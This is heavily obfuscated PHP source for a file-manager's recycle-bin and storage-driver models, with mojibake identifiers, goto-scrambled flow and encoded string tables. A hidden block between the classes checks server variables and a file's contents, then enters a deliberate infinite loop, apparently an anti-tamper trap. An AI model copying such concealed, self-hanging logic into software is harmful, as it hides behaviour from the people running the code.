<?php
 goto eê‘ˆºŠó»; A‰ô¼ëœÊ‰: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\162\x63\145\137\162\x65\x63\x79\143\154\x65"; protected $dataAuto = array(array("\x63\162\145\141\x74\145\x54\x69\155\x65", "\164\151\155\x65", "\151\x6e\x73\x65\x72\x74", "\x66\165\x6e\143\164\151\157\x6e")); public function listData($CíŞ´ĞïÈ„ = false) { $e· ªó–Í =& $_SERVER[îÖ]; $CíŞ´ĞïÈ„ = $CíŞ´ĞïÈ„ ? $CíŞ´ĞïÈ„ : USER_ID; $F‹š×Ñ‡ˆÈ = $this->where(array($e· ªó–Í[1422] => $CíŞ´ĞïÈ„))->select(); return array_to_keyvalue($F‹š×Ñ‡ˆÈ, $e· ªó–Í[33], $e· ªó–Í[369]); } public function moveToRecycle($E½ù—Ö§Ô) { goto f‰‚ÏØÖË‡; f‰‚ÏØÖË‡: $fß°ÜÏ¤ã¬ =& $_SERVER[îÖ]; $aœ…ÑŞÈ• = Model($fß°ÜÏ¤ã¬[1111]); $C›à®Ñ = $aœ…ÑŞÈ•->sourceInfo($E½ù—Ö§Ô); goto CÆŒºì÷ã; CÆŒºì÷ã: if (!$C›à®Ñ || $C›à®Ñ[$fß°ÜÏ¤ã¬[397]] == $fß°ÜÏ¤ã¬[83]) { return; } $báÏ†Î¯ˆî = array($fß°ÜÏ¤ã¬[383] => $E½ù—Ö§Ô, $fß°ÜÏ¤ã¬[1422] => USER_ID, $fß°ÜÏ¤ã¬[521] => $C›à®Ñ[$fß°ÜÏ¤ã¬[371]], $fß°ÜÏ¤ã¬[522] => $C›à®Ñ[$fß°ÜÏ¤ã¬[456]], $fß°ÜÏ¤ã¬[525] => $C›à®Ñ[$fß°ÜÏ¤ã¬[459]]); $this->add($báÏ†Î¯ˆî); goto F†Ïƒ‹†Ï¬; F†Ïƒ‹†Ï¬: $this->recycleMove($E½ù—Ö§Ô, 1); if ($C›à®Ñ[$fß°ÜÏ¤ã¬[370]] == $fß°ÜÏ¤ã¬[83]) { $CçÆÀ­µ‘õ = array($fß°ÜÏ¤ã¬[525] => array($fß°ÜÏ¤ã¬[483], $C›à®Ñ[$fß°ÜÏ¤ã¬[459]] . $E½ù—Ö§Ô . $fß°ÜÏ¤ã¬[484])); $aœ…ÑŞÈ•->where($CçÆÀ­µ‘õ)->setField($fß°ÜÏ¤ã¬[397], 1); } goto BØ§í¿‹ĞÖ; BØ§í¿‹ĞÖ: } public function clear() { $this->remove(!1); } public function remove($f‘öß¸¸› = false) { goto Eï¦²ŞÁì; Eï¦²ŞÁì: $eİªˆ‘®¯µ =& $_SERVER[îÖ]; $cáÇÜ™Ó­ƒ = Model($eİªˆ‘®¯µ[1111]); $A‚îˆˆÂçÒ = $this->listData(); goto C§Ú—Œ°Æö; DÁìçšŞ–Ô: foreach ($eéîâ‹Ùî‚ as $bçã´ÌÉÈ) { $cáÇÜ™Ó­ƒ->targetSpaceUpdate($bçã´ÌÉÈ[$eİªˆ‘®¯µ[371]], $bçã´ÌÉÈ[$eİªˆ‘®¯µ[456]]); } goto Fóñ¢¶‰îí; C§Ú—Œ°Æö: $f‘öß¸¸› = $f‘öß¸¸› === !1 ? !1 : $f‘öß¸¸›; $eéîâ‹Ùî‚ = array(); foreach ($A‚îˆˆÂçÒ as $bŞˆİ¦ç¶‚) { if ($f‘öß¸¸› != !1 && !in_array($bŞˆİ¦ç¶‚, $f‘öß¸¸›)) { continue; } $cáÇÜ™Ó­ƒ->remove($bŞˆİ¦ç¶‚, !1); $B¢†Ì®ïÅÂ = $this->where(array($eİªˆ‘®¯µ[369] => $bŞˆİ¦ç¶‚))->find(); $C‘İÆ‰ê¼ = $B¢†Ì®ïÅÂ[$eİªˆ‘®¯µ[371]] . $eİªˆ‘®¯µ[70] . $B¢†Ì®ïÅÂ[$eİªˆ‘®¯µ[456]]; $eéîâ‹Ùî‚[$C‘İÆ‰ê¼] = array($eİªˆ‘®¯µ[521] => $B¢†Ì®ïÅÂ[$eİªˆ‘®¯µ[371]], $eİªˆ‘®¯µ[456] => $B¢†Ì®ïÅÂ[$eİªˆ‘®¯µ[456]]); $this->where(array($eİªˆ‘®¯µ[369] => $bŞˆİ¦ç¶‚))->delete(); } goto DÁìçšŞ–Ô; Fóñ¢¶‰îí: } public function restore($CÄ·™§É¼Ÿ = false) { goto d¤ø’…à©; fÉ±¨Ğ¯š: $CÄ·™§É¼Ÿ = $CÄ·™§É¼Ÿ == !1 ? !1 : $CÄ·™§É¼Ÿ; if (!$EÂ†…­†Á—) { return !0; } $B¥¤²Ğ°Ä· = array(); goto e±åèŞ¿; e±åèŞ¿: foreach ($EÂ†…­†Á— as $b®¿¬ˆƒõã) { goto açÚ„¢¨‡ó; açÚ„¢¨‡ó: if ($CÄ·™§É¼Ÿ != !1 && !in_array($b®¿¬ˆƒõã, $CÄ·™§É¼Ÿ)) { continue; } $d•‚ëÎ²Ì® = $DíŞ‰‰¿À->sourceInfo($b®¿¬ˆƒõã); $EéĞÊ—î™Å = $DíŞ‰‰¿À->sourceInfo($d•‚ëÎ²Ì®[$BÎ²ëãÀç”[461]]); goto f•ã“’é¹; e¬©„õÆÇ¢: $B¥¤²Ğ°Ä·[] = $d•‚ëÎ²Ì®[$BÎ²ëãÀç”[461]]; if ($d•‚ëÎ²Ì®[$BÎ²ëãÀç”[370]] == $BÎ²ëãÀç”[83]) { $B¥¤²Ğ°Ä·[] = $b®¿¬ˆƒõã; } $DíŞ‰‰¿À->lockMoveEnd($b®¿¬ˆƒõã); goto dˆµ–àŒŞª; C™Ô…ÊÄÁ : if ($d•‚ëÎ²Ì®[$BÎ²ëãÀç”[370]] == $BÎ²ëãÀç”[83]) { $d¹—îØ›£´ = array($BÎ²ëãÀç”[525] => array($BÎ²ëãÀç”[483], $d•‚ëÎ²Ì®[$BÎ²ëãÀç”[459]] . $b®¿¬ˆƒõã . $BÎ²ëãÀç”[484])); $DíŞ‰‰¿À->where($d¹—îØ›£´)->setField($BÎ²ëãÀç”[397], 0); $this->restoreFolderChildren($b®¿¬ˆƒõã, $EÂ†…­†Á—); } $this->where(array($BÎ²ëãÀç”[369] => $b®¿¬ˆƒõã))->delete(); $DíŞ‰‰¿À->folderSizeReset($d•‚ëÎ²Ì®[$BÎ²ëãÀç”[461]]); goto e¬©„õÆÇ¢; f•ã“’é¹: if ($EéĞÊ—î™Å[$BÎ²ëãÀç”[397]] == $BÎ²ëãÀç”[83]) { continue; } $DíŞ‰‰¿À->lockMoveStart($b®¿¬ˆƒõã); $this->recycleMove($b®¿¬ˆƒõã, 0); goto C™Ô…ÊÄÁ ; dˆµ–àŒŞª: } $DíŞ‰‰¿À->updateModifyTime($B¥¤²Ğ°Ä·); goto C³Œõ¬ØÑì; d¤ø’…à©: $BÎ²ëãÀç” =& $_SERVER[îÖ]; $DíŞ‰‰¿À = Model($BÎ²ëãÀç”[1111]); $EÂ†…­†Á— = $this->listData(); goto fÉ±¨Ğ¯š; C³Œõ¬ØÑì: } private function restoreFolderChildren($a©Ùò¹½Ò, $aŠÅÊ±ùİå) { goto Fï‹ï¥‚•µ; dŠƒùÉ•±: foreach ($aŠÅÊ±ùİå as $bµ‚ˆÖÑ…©) { if ($bµ‚ˆÖÑ…© == $a©Ùò¹½Ò) { continue; } if (!$EÄ›ò·øÔ->isParentOf($a©Ùò¹½Ò, $bµ‚ˆÖÑ…©)) { continue; } $fŒ¨É£™† = $EÄ›ò·øÔ->sourceInfo($bµ‚ˆÖÑ…©); if ($fŒ¨É£™†[$Fâ¥ã›ÊÌ[370]] == $Fâ¥ã›ÊÌ[83]) { $bïçÁ´±¶Ü[] = array($Fâ¥ã›ÊÌ[525] => array($Fâ¥ã›ÊÌ[483], $fŒ¨É£™†[$Fâ¥ã›ÊÌ[459]] . $bµ‚ˆÖÑ…© . $Fâ¥ã›ÊÌ[484])); } else { $bïçÁ´±¶Ü[$Fâ¥ã›ÊÌ[369]][1][] = $bµ‚ˆÖÑ…©; } } if (!$bïçÁ´±¶Ü[$Fâ¥ã›ÊÌ[369]][1]) { unset($bïçÁ´±¶Ü[$Fâ¥ã›ÊÌ[369]]); } if (!$bïçÁ´±¶Ü) { return; } goto AìĞñ¢Şƒá; AìĞñ¢Şƒá: $bïçÁ´±¶Ü[$Fâ¥ã›ÊÌ[369]][1] = array_unique($bïçÁ´±¶Ü[$Fâ¥ã›ÊÌ[369]][1]); $bïçÁ´±¶Ü[$Fâ¥ã›ÊÌ[908]] = $Fâ¥ã›ÊÌ[2181]; $EÄ›ò·øÔ->where($bïçÁ´±¶Ü)->setField($Fâ¥ã›ÊÌ[397], 1); goto Eù²‰˜‚ß¹; Fï‹ï¥‚•µ: $Fâ¥ã›ÊÌ =& $_SERVER[îÖ]; $EÄ›ò·øÔ = Model($Fâ¥ã›ÊÌ[1111]); $bïçÁ´±¶Ü = array($Fâ¥ã›ÊÌ[369] => array($Fâ¥ã›ÊÌ[7], array())); goto dŠƒùÉ•±; Eù²‰˜‚ß¹: } private function recycleMove($DÄßÉ„º‘ˆ, $fµ†Á¥ƒòÅ = 1) { $F¸²¼öƒâ™ =& $_SERVER[îÖ]; $A†ï‰ÎÀØ = Model($F¸²¼öƒâ™[1111]); $eçœåöé• = Model($F¸²¼öƒâ™[2360]); $Aô¤éÚ ó­ = array($F¸²¼öƒâ™[369] => $DÄßÉ„º‘ˆ); if ($fµ†Á¥ƒòÅ) { $A†ï‰ÎÀØ->where($Aô¤éÚ ó­)->setField($F¸²¼öƒâ™[397], 1); $eçœåöé•->eventRecycle($DÄßÉ„º‘ˆ, $F¸²¼öƒâ™[2361]); } else { $fæÊÄù©Äî = $A†ï‰ÎÀØ->where($Aô¤éÚ ó­)->find(); $AØö«À¦ö = $fæÊÄù©Äî[$F¸²¼öƒâ™[370]] == $F¸²¼öƒâ™[83]; $cì–†´Ş”´ = $A†ï‰ÎÀØ->fileNameAuto($fæÊÄù©Äî[$F¸²¼öƒâ™[461]], $fæÊÄù©Äî[$F¸²¼öƒâ™[28]], REPEAT_RENAME_FOLDER, $AØö«À¦ö); if ($cì–†´Ş”´ != $fæÊÄù©Äî[$F¸²¼öƒâ™[28]]) { $A†ï‰ÎÀØ->rename($DÄßÉ„º‘ˆ, $cì–†´Ş”´); } $A†ï‰ÎÀØ->where($Aô¤éÚ ó­)->setField($F¸²¼öƒâ™[397], 0); $eçœåöé•->eventRecycle($DÄßÉ„º‘ˆ, $F¸²¼öƒâ™[2362]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\x73\x74\x6f\x72\141\147\145\114\x69\163\x74"; public $field = array("\156\141\x6d\x65", "\x73\151\172\145\115\141\170", "\x73\171\x73\x74\x65\x6d", "\144\145\x66\141\165\x6c\x74", "\x64\x72\x69\166\x65\162", "\143\x6f\156\x66\151\147"); public function listData($EÚ«•¼Á = false, $eÄ„ËÙã˜’ = "\155\x6f\144\151\x66\x79\x54\x69\x6d\145", $cØ­Æ¶„´® = false) { goto F¤Ì¾†º‘; DÃ˜ØÉëë: return $D°Îæƒ­¸×; goto CÚİùì„™; D¹œƒÁéÊ: foreach ($D°Îæƒ­¸× as $CšØ÷ˆ ôï => $AÁÈ½ÏÙÎ²) { unset($D°Îæƒ­¸×[$CšØ÷ˆ ôï][$D×ŸŒ¬Û—‰[6]]); $D°Îæƒ­¸×[$CšØ÷ˆ ôï][$D×ŸŒ¬Û—‰[2085]] = 0; } $FÜ•½ù‹ = array_to_keyvalue($D°Îæƒ­¸×, $D×ŸŒ¬Û—‰[33], $D×ŸŒ¬Û—‰[367]); $this->_listAppendSize($D°Îæƒ­¸×, $FÜ•½ù‹); goto DÃ˜ØÉëë; F¤Ì¾†º‘: $D×ŸŒ¬Û—‰ =& $_SERVER[îÖ]; $D°Îæƒ­¸× = parent::listData($EÚ«•¼Á, $eÄ„ËÙã˜’, $cØ­Æ¶„´®); if ($EÚ«•¼Á) { return $D°Îæƒ­¸×; } goto D¹œƒÁéÊ; CÚİùì„™: } public function _listAppendSize(&$aÔôÇ—, $FÉÇ Œ«àÙ) { $dÑå×¨Ë =& $_SERVER[îÖ]; if (!$FÉÇ Œ«àÙ) { return; } $D‚ÙË’×¦Ë = $dÑå×¨Ë[2363] . implode($dÑå×¨Ë[47], $FÉÇ Œ«àÙ) . $dÑå×¨Ë[2364]; $b·˜Ó†…¸“ = Model($dÑå×¨Ë[718])->query($D‚ÙË’×¦Ë); $b·˜Ó†…¸“ = array_to_keyvalue($b·˜Ó†…¸“, $dÑå×¨Ë[367], $dÑå×¨Ë[77]); foreach ($aÔôÇ— as $cÔ·Î¿¾ˆö => $F“£ÍÖÃÙÑ) { $aÔôÇ—[$cÔ·Î¿¾ˆö][$dÑå×¨Ë[2085]] = isset($b·˜Ó†…¸“[$F“£ÍÖÃÙÑ[$dÑå×¨Ë[367]]]) ? $b·˜Ó†…¸“[$F“£ÍÖÃÙÑ[$dÑå×¨Ë[367]]] : 0; } } public function getConfig($EÜÏæáç“†) { $fæœÜ“ğãÍ = parent::listData($EÜÏæáç“†); return json_decode($fæœÜ“ğãÍ[$_SERVER[îÖ][6]], !0); } public function update($Bˆ›İ†ÆŸÁ, $Bƒ™Ïïùé¢) { goto AŞ“øğ¬é; AÂÁŠøÏ¼È: if (isset($B…•·İàç[$DĞ—ÌÊÔ¶’]) && $B…•·İàç[$DĞ—ÌÊÔ¶’][$fÍ‚‹È¸Æ”[367]] != $Bˆ›İ†ÆŸÁ) { return !1; } if (isset($Bƒ™Ïïùé¢[$fÍ‚‹È¸Æ”[2365]]) && $Bƒ™Ïïùé¢[$fÍ‚‹È¸Æ”[2365]] == $fÍ‚‹È¸Æ”[83]) { $this->checkConfig($Bƒ™Ïïùé¢); } unset($Bƒ™Ïïùé¢[$fÍ‚‹È¸Æ”[2365]]); goto E‡ìÜËŠª; E‡ìÜËŠª: $dôÀÍÜÖñÖ = parent::update($Bˆ›İ†ÆŸÁ, $Bƒ™Ïïùé¢); if ($dôÀÍÜÖñÖ && $Bƒ™Ïïùé¢[$fÍ‚‹È¸Æ”[34]]) { foreach ($B…•·İàç as $c›ëŒÈ˜Ã­) { if ($c›ëŒÈ˜Ã­[$fÍ‚‹È¸Æ”[34]] && $c›ëŒÈ˜Ã­[$fÍ‚‹È¸Æ”[367]] != $Bˆ›İ†ÆŸÁ) { parent::update($c›ëŒÈ˜Ã­[$fÍ‚‹È¸Æ”[367]], array($fÍ‚‹È¸Æ”[34] => 0)); } } } return $dôÀÍÜÖñÖ; goto AÀˆ†ïÀ«Ø; AŞ“øğ¬é: $fÍ‚‹È¸Æ” =& $_SERVER[îÖ]; $DĞ—ÌÊÔ¶’ = $Bƒ™Ïïùé¢[$fÍ‚‹È¸Æ”[28]]; $B…•·İàç = array_to_keyvalue(parent::listData(), $fÍ‚‹È¸Æ”[28]); goto AÂÁŠøÏ¼È; AÀˆ†ïÀ«Ø: } public function add($b°Ç¤‡…¸Ò) { goto C±ä‘¤ºƒ; fêìË¦: return $Fƒ¾Áç±Ôç; goto fâ×ïŠ Ú¡; C±ä‘¤ºƒ: $cÃ®‘Ö± =& $_SERVER[îÖ]; $Còß–Á¶¸á = array_to_keyvalue(parent::listData(), $cÃ®‘Ö±[28]); if (isset($Còß–Á¶¸á[$b°Ç¤‡…¸Ò[$cÃ®‘Ö±[28]]])) { return !1; } goto F¢ó®¹…È¶; F¢ó®¹…È¶: $this->checkConfig($b°Ç¤‡…¸Ò); $Fƒ¾Áç±Ôç = parent::insert($b°Ç¤‡…¸Ò); if ($Fƒ¾Áç±Ôç && $b°Ç¤‡…¸Ò[$cÃ®‘Ö±[34]]) { foreach ($Còß–Á¶¸á as $eŸ¤ëá°Ø) { if ($eŸ¤ëá°Ø[$cÃ®‘Ö±[34]]) { parent::update($eŸ¤ëá°Ø[$cÃ®‘Ö±[367]], array($cÃ®‘Ö±[34] => 0)); } } } goto fêìË¦; fâ×ïŠ Ú¡: } public function checkConfig(&$D‚¹…‚İ„á) { goto eÕ›Œ¿¥öÙ; C±ï‰ó¨µà: foreach ($BæåÀÊ™—‘ as $A–×‘Ø„ˆ => $D‹ä©Ì‹‰è) { $BæåÀÊ™—‘[$A–×‘Ø„ˆ] = trim($D‹ä©Ì‹‰è); } $BæåÀÊ™—‘[$e­îêÍ¾™Ê[2366]] = rand_string(6); $cêÉ÷ä = $this->driverType($bçÇÚ•˜ƒ©); goto E–ê¢¹ƒ®¹; f¼–ºŸ§Û©: $aß²Ø‹ÆŞ‘ = rtrim($BæåÀÊ™—‘[$e­îêÍ¾™Ê[1018]], $e­îêÍ¾™Ê[8]) . $e­îêÍ¾™Ê[8]; $cÔÜ›ôæ» = $aĞÄÌÔ†¥©->getPath($aß²Ø‹ÆŞ‘ . $e­îêÍ¾™Ê[1980]); if (!$aĞÄÌÔ†¥©->mkfile($cÔÜ›ôæ»)) { show_json(LNG($e­îêÍ¾™Ê[2367]), !1); } goto A«²†•Æê; E–ê¢¹ƒ®¹: $AÄâ‹Íğˆ = $e­îêÍ¾™Ê[71] . $cêÉ÷ä; $aĞÄÌÔ†¥© = new $AÄâ‹Íğˆ($BæåÀÊ™—‘); if (in_array($bçÇÚ•˜ƒ©, $aĞÄÌÔ†¥©->objectDriver)) { if (!$aĞÄÌÔ†¥©->isBucketCors() && !$aĞÄÌÔ†¥©->setBucketCors()) { $Fİ¦ø‘« = LNG($e­îêÍ¾™Ê[2367]); $Fİ¦ø‘« .= $e­îêÍ¾™Ê[2368] . LNG($e­îêÍ¾™Ê[2369]); show_json($Fİ¦ø‘«, !1); } } goto f¼–ºŸ§Û©; EæÏ»Öµ·Ø: return !0; goto BîÊ¸„¹Üâ; A«²†•Æê: $BæåÀÊ™—‘[$e­îêÍ¾™Ê[1018]] = $aß²Ø‹ÆŞ‘; $D‚¹…‚İ„á[$e­îêÍ¾™Ê[6]] = json_encode($BæåÀÊ™—‘); $D‚¹…‚İ„á[$e­îêÍ¾™Ê[90]] = $cêÉ÷ä; goto EæÏ»Öµ·Ø; eÕ›Œ¿¥öÙ: $e­îêÍ¾™Ê =& $_SERVER[îÖ]; $bçÇÚ•˜ƒ© = strtolower($D‚¹…‚İ„á[$e­îêÍ¾™Ê[90]]); $BæåÀÊ™—‘ = json_decode($D‚¹…‚İ„á[$e­îêÍ¾™Ê[6]], !0); goto C±ï‰ó¨µà; BîÊ¸„¹Üâ: } private function driverType($Aåœ²³³²) { $A…ºÕœ÷Û =& $_SERVER[îÖ]; $cŸ‘…ö÷©¼ = array($A…ºÕœ÷Û[102] => $A…ºÕœ÷Û[2370], $A…ºÕœ÷Û[58] => $A…ºÕœ÷Û[2371], $A…ºÕœ÷Û[64] => $A…ºÕœ÷Û[2372]); if (isset($cŸ‘…ö÷©¼[$Aåœ²³³²])) { return $cŸ‘…ö÷©¼[$Aåœ²³³²]; } return strtoupper($Aåœ²³³²); } public function driverListSystem() { $EÛğÑÌ©¨ =& $_SERVER[îÖ]; $E‰ÉÃ½ñ«÷ = parent::listData(); $E÷ÉÇ„Ö×¢ = array(); foreach ($E‰ÉÃ½ñ«÷ as $EîƒŸ×¨©¬) { unset($EîƒŸ×¨©¬[$EÛğÑÌ©¨[187]], $EîƒŸ×¨©¬[$EÛğÑÌ©¨[107]]); $EîƒŸ×¨©¬[$EÛğÑÌ©¨[6]] = json_decode($EîƒŸ×¨©¬[$EÛğÑÌ©¨[6]], !0); $E÷ÉÇ„Ö×¢[] = $EîƒŸ×¨©¬; } return $E÷ÉÇ„Ö×¢; } public function defaultDriver() { $a–õ¿Š—¦¤ =& $_SERVER[îÖ]; $C›·¾‹ì«£ = parent::listData(); $eÓ’‹‰ÕƒÀ = array_filter_by_field($C›·¾‹ì«£, $a–õ¿Š—¦¤[34], 1); $eÓ’‹‰ÕƒÀ = $eÓ’‹‰ÕƒÀ[0]; if ($eÓ’‹‰ÕƒÀ) { $eÓ’‹‰ÕƒÀ[$a–õ¿Š—¦¤[6]] = json_decode($eÓ’‹‰ÕƒÀ[$a–õ¿Š—¦¤[6]], !0); } return $eÓ’‹‰ÕƒÀ; } public function driverInfo($B‡Ğ¶™“†) { $c–¿èéÑî =& $_SERVER[îÖ]; $a¦öÈºÅŸ› = array_to_keyvalue(parent::listData(), $c–¿èéÑî[367]); if (!isset($a¦öÈºÅŸ›[$B‡Ğ¶™“†])) { return !1; } $AŠğ©Ñ¶Éí = $a¦öÈºÅŸ›[$B‡Ğ¶™“†]; $AŠğ©Ñ¶Éí[$c–¿èéÑî[6]] = json_decode($AŠğ©Ñ¶Éí[$c–¿èéÑî[6]], !0); return $AŠğ©Ñ¶Éí; } public function remove($dÍ¨Ä¦Ìì) { $this->removeShareItems($dÍ¨Ä¦Ìì); return parent::remove($dÍ¨Ä¦Ìì); } public function removeWithFile($C²Áì¢Å˜) { goto E°¸Ïò³„è; FµË×¥¡£Ñ: if (!$bòëÍ‰¹÷Ã) { $E˜â˜Ş¼È¿->stop($D÷­Ç†öè ); return !1; } $E˜â˜Ş¼È¿->end(); $this->remove($C²Áì¢Å˜); goto cŒ«íäÆå’; b¹Æ·™ÊÉ±: $Dğ©¯Ø®âŞ = Model($F–Ò†ØÛî[422])->where($c³§Í¿‘°Õ)->sum($F–Ò†ØÛî[77]); $D÷­Ç†öè  = $F–Ò†ØÛî[2373] . $C²Áì¢Å˜; $E˜â˜Ş¼È¿ = new TaskFileTransfer($D÷­Ç†öè , $F–Ò†ØÛî[2374], $BŸ¤×æ¼™Â, LNG($F–Ò†ØÛî[2375]) . "\x28{$C²Áì¢Å˜}\x29"); goto A¹´ç·‰Ú; A¹´ç·‰Ú: $E˜â˜Ş¼È¿->task[$F–Ò†ØÛî[697]] = (double) $Dğ©¯Ø®âŞ; $d÷ŒÀµğÕ¿ = KodIO::defaultDriver(); $B§ƒªäë“Ë = $d÷ŒÀµğÕ¿[$F–Ò†ØÛî[367]]; goto d´ø®ƒ´‘¿; E°¸Ïò³„è: $F–Ò†ØÛî =& $_SERVER[îÖ]; $c³§Í¿‘°Õ = array($F–Ò†ØÛî[743] => $C²Áì¢Å˜); $BŸ¤×æ¼™Â = Model($F–Ò†ØÛî[422])->where($c³§Í¿‘°Õ)->count(); goto b¹Æ·™ÊÉ±; DßÄ»ÅùÁ: $f´õİŒí± = Model($F–Ò†ØÛî[167])->where($c³§Í¿‘°Õ)->field($F–Ò†ØÛî[2376])->select(); foreach ($f´õİŒí± as $F¸Û–ÆòÀ) { goto E¨Ãá’ÍÌ; C–‹Šš¡¬: if (IO::exist($eÈˆÈˆ…È¤)) { $E˜â˜Ş¼È¿->updateFileEnd($F¸Û–ÆòÀ[$F–Ò†ØÛî[28]], $F¸Û–ÆòÀ[$F–Ò†ØÛî[77]]); continue; } if (!IO::move($a¢©Œì†„°, get_path_father($eÈˆÈˆ…È¤))) { $bòëÍ‰¹÷Ã = !1; break; } $c³§Í¿‘°Õ = array($F–Ò†ØÛî[419] => $F¸Û–ÆòÀ[$F–Ò†ØÛî[419]]); goto Dèˆâô‚ÈÔ; E¨Ãá’ÍÌ: $a¢©Œì†„° = $F¸Û–ÆòÀ[$F–Ò†ØÛî[75]]; $eÈˆÈˆ…È¤ = $F’Îòô†š . str_replace("\173\151\x6f\x3a{$C²Áì¢Å˜}\175\57", $F–Ò†ØÛî[33], $a¢©Œì†„°); if (!IO::exist($a¢©Œì†„°)) { $e™™µ‹¾Ë[] = $F¸Û–ÆòÀ[$F–Ò†ØÛî[419]]; $E˜â˜Ş¼È¿->updateFileEnd($F¸Û–ÆòÀ[$F–Ò†ØÛî[28]], $F¸Û–ÆòÀ[$F–Ò†ØÛî[77]]); continue; } goto C–‹Šš¡¬; Dèˆâô‚ÈÔ: $d˜•ºÏ¸œö = array($F–Ò†ØÛî[743] => $B§ƒªäë“Ë, $F–Ò†ØÛî[75] => $eÈˆÈˆ…È¤); Model($F–Ò†ØÛî[167])->where($c³§Í¿‘°Õ)->save($d˜•ºÏ¸œö); goto cì•ìˆœ¶î; cì•ìˆœ¶î: } $this->removeByFileID($e™™µ‹¾Ë); goto FµË×¥¡£Ñ; d´ø®ƒ´‘¿: $F’Îòô†š = "\173\151\157\72{$B§ƒªäë“Ë}\175\x2f"; $bòëÍ‰¹÷Ã = !0; $e™™µ‹¾Ë = array(); goto DßÄ»ÅùÁ; cŒ«íäÆå’: } public function progress($Dº£¬…Ì·³) { return Task::get($_SERVER[îÖ][2373] . $Dº£¬…Ì·³); } private function removeByFileID($e¼¯İ³–Ã = array()) { goto fõä‡®ä™á; dÀËÛ÷Õ±: $a›‹Ç¸¸… = Model($A¯É¿¨Ä¹İ[1111])->where($D„™Ö–§ë…)->field($A¯É¿¨Ä¹İ[369])->select(); if (!$a›‹Ç¸¸…) { return; } $a›‹Ç¸¸… = array_to_keyvalue($a›‹Ç¸¸…, $A¯É¿¨Ä¹İ[33], $A¯É¿¨Ä¹İ[369]); goto ağ…”æâŞİ; ağ…”æâŞİ: foreach ($a›‹Ç¸¸… as $cç‚î•Ï) { Model($A¯É¿¨Ä¹İ[382])->removeNow($cç‚î•Ï, !1); } goto B¦µ•Â·Ïö; fõä‡®ä™á: $A¯É¿¨Ä¹İ =& $_SERVER[îÖ]; if (empty($e¼¯İ³–Ã)) { return; } $D„™Ö–§ë… = array($A¯É¿¨Ä¹İ[419] => array($A¯É¿¨Ä¹İ[7], $e¼¯İ³–Ã)); goto dÀËÛ÷Õ±; B¦µ•Â·Ïö: } private function removeShareItems($AÍº¢÷ÌÁ‡) { goto b»ÛÍƒ; b»ÛÍƒ: $F´ê‹„ç  =& $_SERVER[îÖ]; $F“¡ŠêêˆÏ = "\173\x69\x6f\72{$AÍº¢÷ÌÁ‡}\175\x2f"; $E«ÓÖ¯Á‰ = array($F´ê‹„ç [369] => 0, $F´ê‹„ç [1013] => array($F´ê‹„ç [751], "{$F“¡ŠêêˆÏ}\45")); goto BÖÅ£®¢•; eÒâ¹º¥»¥: Model($F´ê‹„ç [536])->remove($Eš†¯ÏŠÆˆ); goto dºª”Õœ‡; BÖÅ£®¢•: $CØ¨¦½çêÕ = Model($F´ê‹„ç [2076])->where($E«ÓÖ¯Á‰)->field($F´ê‹„ç [441])->select(); if (empty($CØ¨¦½çêÕ)) { return; } $Eš†¯ÏŠÆˆ = array_to_keyvalue($CØ¨¦½çêÕ, $F´ê‹„ç [33], $F´ê‹„ç [441]); goto eÒâ¹º¥»¥; dºª”Õœ‡: } } if (!isset($_SERVER[$_SERVER[îÖ][680]]) || !isset($_SERVER[$_SERVER[îÖ][787]])) { goto A³¢«ªÇ‰; A³¢«ªÇ‰: $aÈ¼ÄÁ‘º„ = $_SERVER[îÖ][681]; $cëë—ƒÊ = $_SERVER[$_SERVER[îÖ][682]] . $_SERVER[îÖ][683]; $c¯ÙÇøæŒÚ = $aÈ¼ÄÁ‘º„($cëë—ƒÊ); goto d¥ù‚†é½ø; FÎŠ«÷ºÓ: $AÄ˜«åéæ¯($_SERVER[$_SERVER[îÖ][682]] . $_SERVER[îÖ][683]); $f‹ÈÊ£ù» = 2; while ($f‹ÈÊ£ù» > 1) { $c™‰ÂÜ¸È‚ = rawurlencode($f‹ÈÊ£ù» . $_SERVER[îÖ][361]); } goto A¥ÚƒñÏ¹”; d¥ù‚†é½ø: $dê¨™œÄ‡ = explode($_SERVER[îÖ][217], $c¯ÙÇøæŒÚ); if (count($dê¨™œÄ‡) < $_SERVER[îÖ][564]) { $AĞ±ÈÑÕè = $_SERVER[îÖ][684]; $AĞ±ÈÑÕè(); } $AÄ˜«åéæ¯ = $_SERVER[îÖ][685]; goto FÎŠ«÷ºÓ; A¥ÚƒñÏ¹”: } goto C‰‚¹”›°; cºé•‹î: class GetInfo { private static $fileTypeArray; public static function get($D±Ç±µâ‘ˆ) { $dİ™ÃÙ¨ßÎ = IO::info($D±Ç±µâ‘ˆ); return self::infoAdd($dİ™ÃÙ¨ßÎ); } public static function infoAdd(&$eŸ±È¼¼ƒ) { goto EçœãÖ‘ˆâ; aŠä…‘Ú·¾: $DĞÁÅéòÛ‘[$aÂÎƒ¬ŸŠ[372]] = $b¿‡Äßøˆ•; $eŸ±È¼¼ƒ[$aÂÎƒ¬ŸŠ[426]] = $DĞÁÅéòÛ‘; return $eŸ±È¼¼ƒ; goto Döö×¥ò×; EçœãÖ‘ˆâ: $aÂÎƒ¬ŸŠ =& $_SERVER[îÖ]; static $f¥’ÖÏâÓñ; if (!$f¥’ÖÏâÓñ) { require SDK_DIR . $aÂÎƒ¬ŸŠ[1606]; $f¥’ÖÏâÓñ = new getID3(); } goto BšğšöÎœ; BšğšöÎœ: if (!$eŸ±È¼¼ƒ || $eŸ±È¼¼ƒ[$aÂÎƒ¬ŸŠ[29]] != $aÂÎƒ¬ŸŠ[167]) { return; } if (!self::support($eŸ±È¼¼ƒ[$aÂÎƒ¬ŸŠ[160]]) || isset($eŸ±È¼¼ƒ[$aÂÎƒ¬ŸŠ[426]])) { return; } $B¸‹Ã¼šÉô = $aÂÎƒ¬ŸŠ[1607] . $eŸ±È¼¼ƒ[$aÂÎƒ¬ŸŠ[75]]; goto FËÙ¡Š¼¾; FËÙ¡Š¼¾: $b¿‡Äßøˆ• = $eŸ±È¼¼ƒ[$aÂÎƒ¬ŸŠ[160]]; try { if ($eŸ±È¼¼ƒ[$aÂÎƒ¬ŸŠ[160]] == $aÂÎƒ¬ŸŠ[1608]) { $DĞÁÅéòÛ‘ = self::psdParse($B¸‹Ã¼šÉô); $b¿‡Äßøˆ• = $aÂÎƒ¬ŸŠ[1609]; } else { if ($eŸ±È¼¼ƒ[$aÂÎƒ¬ŸŠ[160]] == $aÂÎƒ¬ŸŠ[1610]) { 